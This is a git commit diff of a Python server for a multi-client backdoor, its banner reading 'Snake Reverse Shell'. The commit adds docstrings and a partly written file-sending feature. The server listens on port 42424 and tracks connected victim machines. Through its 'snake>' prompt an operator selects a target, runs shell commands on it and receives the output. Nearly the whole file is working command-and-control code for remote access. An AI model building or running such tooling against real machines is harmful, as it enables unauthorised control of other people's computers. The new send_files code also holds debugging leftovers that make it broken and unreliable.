6078091c736b399652722632cf57411e592cda78
Ofer <ofer026@gmail.com>
2020-04-12 21:45:06 +0300

    Added comments and docstrings

--- Multi client and backdoor/server.py
+++ Multi client and backdoor/server.py
@@ -1,18 +1,22 @@
 import socket
-import sys
 import threading
 from _thread import *
-import _thread
 from queue import Queue
 from time import sleep
+from tkinter import filedialog
+import tkinter as tk
+import platform
+import getpass
 
 # ------- CONSTANTS -------
 HEADERSIZE = 10
 number_of_threads = 2
 job_number = [1, 2]
 queue = Queue()
+
 all_connections = []
 all_addresses = []
+# List of all commands in the interactive prompt and unique commands in the shell
 COMMANDS = {'help': ['Shows this help'],
             'list': ['Lists connected clients'],
             'select': ['Selects a client by its index. Takes index as a parameter'],
@@ -23,7 +27,7 @@ COMMANDS = {'help': ['Shows this help'],
             'shutdown': ['Shuts server down'],
             }
 
-# Parts of the hello message
+# --------- Hello Message ------------
 hello_message_1 = "__        __         _                                       _               ____                    _\n" \
                   "\ \      / /   ___  | |   ___    ___    _ __ ___     ___    | |_    ___     / ___|   _ __     __ _  | | __   ___ \n" \
                   " \ \ /\ / /   / _ \ | |  / __|  / _ \  | '_ ` _ \   / _ \   | __|  / _ \    \___ \  | '_ \   / _` | | |/ /  / _ \ \n" \
@@ -36,13 +40,17 @@ hello_message_2 = " ____                                                ____    
                   "|_| \_\  \___|   \_/    \___| |_|    |___/  \___|   |____/  |_| |_|  \___| |_| |_|\n"
 
 
-# prints all the commands and their when "help" is typed in the interactive prompt
+# prints all the commands and their description when "help" is typed in the interactive prompt
 def help():
     for cmd, v in COMMANDS.items():
         print("{0}:\t{1}".format(cmd, v[0]))
 
 
 def setup():
+    """
+    This function sets up the socket to listen for connections
+    :return: None
+    """
     global s
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind(("", 42424))  # bind the socket to every possible way to reach the machine on port 42424
@@ -51,6 +59,10 @@ def setup():
 
 
 def accept_connections():
+    """
+    This function accepts all arriving connections
+    :return: None
+    """
     for c in all_connections:
         c.close()
     del all_connections[:]
@@ -69,7 +81,11 @@ def accept_connections():
 
 # Interactive prompt for sending commands remotely
 def start_snake():
-    sleep(0.5)
+    """
+    This function handles the input from the interactive prompt
+    :return: None
+    """
+    sleep(0.5)  # enable the server to initialize before the interactive prompt
     while True:
         try:
             cmd = input("snake> ")
@@ -78,31 +94,62 @@ def start_snake():
         if "list" in cmd:
             list_connections()
         elif "select" in cmd:
-            conn = get_target(cmd)
-            if conn is not None:
-                send_target_commands(conn)
+            conn = get_target(cmd)  # Get the selected socket object
+            if conn is not None:  # Checks if the sockets is not None (if its exists)
+                send_target_commands(conn)  # Start sending commands to the target socket
         elif "shutdown" in cmd:
             # Close all jobs
             queue.task_done()
             queue.task_done()
             # Exit the program completely
             quit()
+        elif "send" in cmd:
+            list_connections()
+            send_files(win) # Starts the process of sending a file to the target socket
         elif "help" in cmd:
             help()
         else:
             print("snake: Command \'{}\' is not recognized".format(cmd))
 
 
+# send files to a selected client
+def send_files(window):
+    try:
+        connection_num = int(input("select a connection> "))
+        connection_num = 1
+        if connection_num <= -1:
+            print("Enter a positive number")
+            raise Exception("Negative number given")
+        conn = all_connections[connection_num]
+    except ValueError:
+        print("Enter a Number")
+        return
+    except IndexError:
+        print("Enter a number within the range of connections numbers")
+        # return # return is commented only for debugging
+        pass
+    except Exception("Negative number given"):
+        return
+    if platform.system() == "Windows":
+        window.file = filedialog.askopenfile(parent=win, initialdir=f"C:\\Users\\{getpass.getuser()}\\Documents", title="Select File")
+
+
 # Displays all current connections
 def list_connections():
+    """
+    This function displays all current connection nd checks if they are still active
+    (if not the connection is deleted)
+    :return: None
+    """
     results = "id      IP          Port\n"
     for i, connection in enumerate(all_connections):
         try:
-            check_alive_msg = "check alive test"
+            check_alive_msg = "check alive test"  # The echo message content
             check_alive_msg = f"{len(check_alive_msg):<{HEADERSIZE}}" + check_alive_msg
             connection.send(bytes(check_alive_msg, "utf-8"))
             connection.recv(1024)
         except:
+            # If there was a problem sending a message to the socket and receiving data from it, the connection will be deleted
             del all_connections[i]
             del all_addresses[i]
             continue
@@ -110,8 +157,12 @@ def list_connections():
     print("------- Clients ------" + "\n" + results)
 
 
-# Select a target client
 def get_target(cmd):
+    """
+    This function get the target socket from the list of connections
+    :param cmd: int
+    :return: socket object (or None)
+    """
     try:
         target = cmd.replace("select ", "")
         target = int(target)
@@ -126,13 +177,18 @@ def get_target(cmd):
 
 # Connect with remote target client
 def send_target_commands(conn):
+    """
+    This function sends commands to the selected socket and gets the output of those commands from the target socket
+    :param conn: socket object
+    :return: None
+    """
     while True:
         try:
-            cmd = input()
+            cmd = input()  # get the command the user want to send to the target
             if cmd == "quit":
-                break
+                break  # returns back to the interactive prompt
             if len(str.encode(cmd)) > 0:
-                cmd = f"{len(cmd):<{HEADERSIZE}}" + cmd
+                cmd = f"{len(cmd):<{HEADERSIZE}}" + cmd  # add the header to the command
                 conn.send(bytes(cmd, "utf-8"))
                 client_response = ""
                 is_new = True
@@ -143,6 +199,10 @@ def send_target_commands(conn):
                         print("Connection has been closed by the client")
                         return
                     if is_new:
+                        '''
+                        This if statement checks if this a new message. if true we expect to the header of the message,
+                        which has the length of the message inside
+                        '''
                         try:
                             response_len = int(msg[:HEADERSIZE])
                         except ValueError:
@@ -163,6 +223,10 @@ threads = []
 
 
 def create_workers():
+    """
+    This function creates the threads (workers)
+    :return: None
+    """
     for _ in range(number_of_threads):
         t = start_new_thread(work, (None, None))
         threads.append(t)
@@ -170,13 +234,21 @@ def create_workers():
 
 # Do the next job in the queue (one handles connections,  other sends commands)
 def work(h, g):
+    """
+    this function alloctes the tasks to the threads
+    one thread sets up the server socket and listens to new connections,
+    and the other handles commands from the interactive prompt and sends commands to selected targets
+    :param h: None
+    :param g: None
+    :return: None
+    """
     while True:
         x = queue.get()
         if x == 1:
             setup()
             accept_connections()
         if x == 2:
-            start_snake()
+            start_snake()  # Starts the interactive prompt
         queue.task_done()
 
 
@@ -188,8 +260,12 @@ def create_jobs():
 
 
 if __name__ == "__main__":
+    global win
+    win = tk.Tk()
+    win.withdraw()
     print(hello_message_1)
     print(hello_message_2)
     print("type \'help\' to get the list of all commands")
     create_workers()
     create_jobs()
+
